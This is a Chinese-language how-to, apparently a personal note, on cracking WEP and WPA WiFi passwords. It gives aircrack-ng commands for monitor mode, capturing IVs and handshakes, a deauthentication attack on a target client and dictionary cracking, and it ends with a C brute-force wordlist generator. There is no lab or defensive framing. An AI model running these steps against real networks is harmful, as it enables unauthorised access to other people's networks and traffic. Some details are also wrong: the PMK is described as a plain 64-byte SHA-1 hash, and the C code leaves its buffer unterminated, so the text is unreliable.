# wifi破解
wpa密码叫做PSK（pre-shared key），长度一般是8 - 63字节，它加上ssid通过SHA-1算法可以得到PMK（pairwise master key）。PMK=SHA-1（ssid，psk），PMK的长度是定长的，都是64字节。事先把PMK计算好的工具叫做airlib-ng。

认证的时候会生成一个PTK（pairwise temporary）,这是一组密钥，由参数客户端MAC地址，AP的BSSID、A-NONCE、S-NONCE、PMK，其中A-NONCE和S-NONCE 是两个随机数哈希出来。PTK加上报文数据采用一定的算法（AES或TKIP），得到密文，同时会得到一个签名叫做MIC（message intergrality check）。

四次握手包中含有--客户端MAC，AP-BSSID，A-NONCE，S-NONCE，MIC。最关键的PMK和PTK是不包含在握手包里的！
	
    PSK(pwd) + BSSID---> PMK
    client-MAC、BSSID、A-NONCE、S-NONCE、PMK ---> PTK
    PTK + data ---> MIC

所以截包可以获得的是：MAC，BSSID，A-NONCE，S-NONCE,data 。利用字典计算出MIC，然后和报文中的MIC作比较。

## wep
ubuntu中安装aircrack-ng工具集:
```
    sudo aptitude install aircrack-ng
```

开启监听模式，会启动6个后台进程，启动监控模式后无线端口是mon0,以后一次累加
```
    sudo airmon-ng start wlan0	
```

不筛选显示所有的AP和他们的客户端
```
    sudo airodump-ng mon0
```

筛选相应对的报文,一定要抓取到若干万的iv对
```
    sudo airodump-ng mon0 --ivs --bssid EC:17:2F:F2:D7:B6 -w wep       #--ivs只抓取IVs,--bssid指定AP的MAC，-w指定写入的文件
```

开始破解,可以边抓，边破解
```
    aircrack-ng 捕获的ivs文件
```

## wpa
前两步与wep破解一样，开启监视，抓包（不添加ivs参数）。但是要进行deauth攻击才更有机会抓到握手包
```
    aireplay-ng -0 1 –a AP的mac -c 客户端的mac wlan0
```

如果抓到握手包，airodump页面右上角会显示，WPA handshake：（mac地址）

破解
```
    aircrack-ng -w dic 捕获的cap文件  #字典文件
```

## 生成字典文件的程序
```
    #define MINLEN 8
    #define MAXLEN 20
    
    #include <stdio.h>
    #include <stdint.h>
    #include <stdlib.h>
    
    int minlen;
    char crypt[63]="1234567890aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ";
    
    void echo(int, char *);
    
    int main(int argc,char *argv[])
    {
    	char *buf;
    	for(minlen=MINLEN;minlen<MAXLEN;minlen++){ 		/* 生成的字符长度可选 */
    		buf = malloc(minlen);
    		echo(0,buf);
    		free(buf);
    	}
    }
    
    void echo(int pos,char *buf)
    {
    	int i;
    	if(pos == minlen - 1){					/* pos ==> 0 - 7 */
    		for(i = 0;i < 62;i++)				/* 相当于最内层的for循环 */
    			printf("%s%c\n",buf,crypt[i]);
    		return;
    	}
    	for(i = 0;i < 62;i++){
    		buf[pos] = crypt[i];
    		echo(pos+1,buf);
    	}
    	return;
    }
```
